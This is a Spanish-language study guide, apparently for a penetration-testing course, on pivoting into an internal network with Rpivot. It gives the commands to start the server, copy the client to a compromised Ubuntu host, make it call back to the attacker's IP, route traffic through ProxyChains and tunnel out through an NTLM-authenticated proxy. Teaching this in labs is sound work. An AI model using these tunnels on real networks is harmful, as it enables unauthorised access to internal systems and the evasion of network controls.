
## 1. Concepto

**Rpivot** es una herramienta de proxy SOCKS inverso escrita en Python 2 que permite pivotar desde una máquina dentro de una red interna hacia un servidor externo.

Su funcionamiento consiste en establecer una conexión desde el cliente situado en la red interna hacia un servidor externo. Una vez establecida, podemos utilizar el proxy SOCKS del servidor para acceder a recursos internos que no son directamente accesibles desde nuestra máquina de ataque.

### Escenario

Tenemos un servidor web interno en `172.16.5.135:80` al que queremos acceder desde nuestra máquina de ataque.

```
Máquina de ataque
       |
       | Puerto 9999
       v
Servidor Rpivot (10.10.14.18)
       |
       | Conexión inversa del cliente
       v
Máquina pivote Ubuntu
       |
       v
Servidor web interno
172.16.5.135:80
```

Rpivot utiliza dos puertos principales en el servidor:

- **9999:** recibe la conexión del cliente Rpivot.
    
- **9050:** proporciona el proxy SOCKS utilizado para pivotar.
    

## 2. Descargar Rpivot

En la máquina de ataque, clonamos el repositorio:

```
git clone https://github.com/klsecservices/rpivot.git
```

Entramos en el directorio:

```
cd rpivot
```

## 3. Iniciar el servidor Rpivot

En la máquina de ataque, ejecutamos `server.py`:

```
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

### Parámetros

|Parámetro|Descripción|
|---|---|
|`--proxy-port 9050`|Puerto del proxy SOCKS que utilizará el atacante.|
|`--server-port 9999`|Puerto en el que el servidor recibe las conexiones de los clientes Rpivot.|
|`--server-ip 0.0.0.0`|Escucha en todas las interfaces IPv4 locales.|

El servidor queda preparado para recibir la conexión de la máquina pivote y proporcionar el proxy SOCKS.

## 4. Transferir Rpivot a la máquina pivote

Debemos transferir los archivos de Rpivot a la máquina Ubuntu comprometida.

Desde la máquina de ataque, utilizamos SCP:

```
scp -r rpivot ubuntu@<IP_DEL_PIVOTE>:/home/ubuntu/
```

Sustituimos `<IP_DEL_PIVOTE>` por la dirección IP del servidor Ubuntu al que podemos conectarnos por SSH.

## 5. Ejecutar el cliente Rpivot

En la máquina pivote, entramos en el directorio transferido y ejecutamos `client.py`:

```
python2 client.py --server-ip 10.10.14.18 --server-port 9999
```

### Parámetros

|Parámetro|Descripción|
|---|---|
|`--server-ip 10.10.14.18`|Dirección IP de la máquina de ataque que ejecuta `server.py`.|
|`--server-port 9999`|Puerto del servidor Rpivot al que debe conectarse el cliente.|

La salida esperada es similar a:

```
Backconnecting to server 10.10.14.18 port 9999
```

En la máquina de ataque, el servidor debería mostrar una nueva conexión.

**Importante:** el cliente debe utilizar una dirección IP de la máquina de ataque que sea alcanzable desde la máquina pivote.

## 6. Configurar ProxyChains

Una vez establecida la conexión, configuramos ProxyChains para utilizar el proxy SOCKS de Rpivot.

En la configuración de ProxyChains, añadimos:

```
socks4 127.0.0.1 9050
```

El puerto `9050` corresponde al proxy SOCKS iniciado por `server.py`.

La configuración permite dirigir las conexiones de las aplicaciones compatibles a través de Rpivot y alcanzar servicios de la red interna.

> Si ya existe una configuración de ProxyChains, comprueba que se esté utilizando el proxy correcto y evita dejar entradas antiguas que puedan interferir.

## 7. Acceder al servidor web interno

Con el servidor y el cliente Rpivot conectados, podemos abrir Firefox ESR mediante ProxyChains:

```
proxychains firefox-esr 172.16.5.135:80
```

La conexión sigue este recorrido:

```
Firefox ESR
     |
     v
ProxyChains
     |
     v
Proxy SOCKS de Rpivot
127.0.0.1:9050
     |
     v
Conexión Rpivot
     |
     v
Máquina pivote Ubuntu
     |
     v
Servidor web interno
172.16.5.135:80
```

Si el túnel funciona y el servidor web está disponible, podremos visualizar la página web desde nuestra máquina de ataque.

## 8. Pivotaje a través de un proxy HTTP con autenticación NTLM

En algunos entornos corporativos, la máquina pivote no puede conectarse directamente al servidor externo porque debe atravesar un proxy HTTP que exige autenticación NTLM.

Rpivot admite parámetros adicionales para configurar esta conexión.

Ejemplo del módulo:

```
python client.py \
  --server-ip <IP_SERVIDOR_DESTINO> \
  --server-port 8080 \
  --ntlm-proxy-ip <IP_PROXY_HTTP> \
  --ntlm-proxy-port 8081 \
  --domain <DOMINIO_WINDOWS> \
  --username <USUARIO> \
  --password <CONTRASEÑA>
```

### Parámetros adicionales

|Parámetro|Descripción|
|---|---|
|`--ntlm-proxy-ip`|Dirección IP del proxy HTTP que requiere autenticación NTLM.|
|`--ntlm-proxy-port`|Puerto del proxy HTTP.|
|`--domain`|Dominio de Windows utilizado para la autenticación.|
|`--username`|Usuario para autenticarse en el proxy.|
|`--password`|Contraseña del usuario.|

Esta configuración permite que el cliente Rpivot se conecte a través del proxy HTTP autenticado cuando el entorno lo requiere.

**Nota:** el comando utiliza `python` en el ejemplo del módulo, mientras que el procedimiento principal utiliza Python 2. Hay que comprobar qué intérprete requiere la versión de Rpivot disponible en el laboratorio.

## 9. Diferencias entre sshuttle y Rpivot

|Característica|sshuttle|Rpivot|
|---|---|---|
|Funcionamiento|Enruta tráfico mediante SSH.|Crea un túnel de proxy SOCKS inverso.|
|Conexión|El atacante se conecta al servidor SSH pivote.|El cliente interno inicia la conexión hacia el servidor Rpivot externo.|
|Herramienta complementaria|No necesita ProxyChains para el escenario habitual del módulo.|Puede utilizarse con ProxyChains.|
|Uso principal|Enrutar tráfico hacia redes accesibles desde el servidor SSH.|Acceder a recursos internos mediante una conexión inversa.|
|Tecnología indicada en el módulo|SSH.|Python 2 y SOCKS.|

## 10. Puntos clave para el examen

- Rpivot es una herramienta de **proxy SOCKS inverso**.
    
- El servidor se ejecuta mediante `server.py` en la máquina de ataque.
    
- El cliente se ejecuta mediante `client.py` en la máquina pivote.
    
- El cliente interno inicia la conexión hacia el servidor externo.
    
- En el ejemplo, el puerto `9999` recibe las conexiones de los clientes y el `9050` proporciona el proxy SOCKS.
    
- ProxyChains permite utilizar el proxy SOCKS para acceder al servidor web interno.
    
- Rpivot también contempla conexiones a través de proxies HTTP con autenticación NTLM.
    
- La máquina pivote debe poder alcanzar tanto el servidor Rpivot como los recursos internos que queremos utilizar.
    
- Si no funciona, comprueba la IP del servidor, los puertos, la conectividad entre cliente y servidor, la configuración de ProxyChains y la disponibilidad de Python 2.
    

### Flujo de trabajo para recordar

```
1. Clonar Rpivot en la máquina de ataque.
2. Iniciar server.py en los puertos 9050 y 9999.
3. Transferir Rpivot a la máquina pivote.
4. Ejecutar client.py desde la máquina pivote.
5. Configurar ProxyChains para usar 127.0.0.1:9050.
6. Acceder al recurso interno con una aplicación compatible.
```
